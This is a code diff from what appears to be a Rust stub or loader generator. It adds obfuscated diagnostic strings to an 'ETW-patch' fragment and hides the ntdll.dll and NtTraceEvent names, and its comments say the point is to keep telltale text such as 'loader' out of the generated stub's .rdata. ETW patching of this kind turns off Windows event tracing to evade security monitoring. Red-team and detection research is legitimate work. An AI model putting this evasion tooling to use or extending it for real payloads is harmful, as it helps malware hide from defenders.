@@ -72,6 +72,28 @@ pub const DEF: TechniqueDef = TechniqueDef {
     resolves_imports: false,
 };
 
+/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
+/// pairs.
+///
+/// `render_fragment` replaces each placeholder with code that rebuilds the
+/// message at runtime, so no diagnostic text — and no technique keyword like
+/// `loader` — lands in the generated stub's `.rdata`.
+const MESSAGES: &[(&str, &str)] = &[
+    ("$MSG_LOAD_FAILED$", "failed to load the library to patch"),
+    (
+        "$MSG_RESOLVE_FAILED$",
+        "failed to resolve the function to patch",
+    ),
+    (
+        "$MSG_MAKE_WRITABLE_FAILED$",
+        "failed to make the target function writable",
+    ),
+    (
+        "$MSG_RESTORE_PROTECTION_FAILED$",
+        "failed to restore the target function protection",
+    ),
+];
+
 impl Params {
     /// Renders the ETW-patch stub fragment, obfuscating the `ntdll.dll` and
     /// every event-writing export name through `strings` so they are rebuilt at
@@ -90,7 +112,17 @@ impl Params {
         let etw_nt_trace_func = strings
             .obfuscate("NtTraceEvent")
             .render_stub_expr("etw_nt_trace_func");
-        DEF.stub_fragment
+
+        let mut rendered = DEF.stub_fragment.to_string();
+        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
+            rendered = rendered.replace(
+                placeholder,
+                &strings
+                    .obfuscate(text)
+                    .render_stub_expr(&format!("etw_msg_{index}")),
+            );
+        }
+        rendered
             .replace("$ETW_DLL_DEF$", &etw_dll)
             .replace("$ETW_FUNC_DEF$", &etw_func)
             .replace("$ETW_FULL_FUNC_DEF$", &etw_full_func)
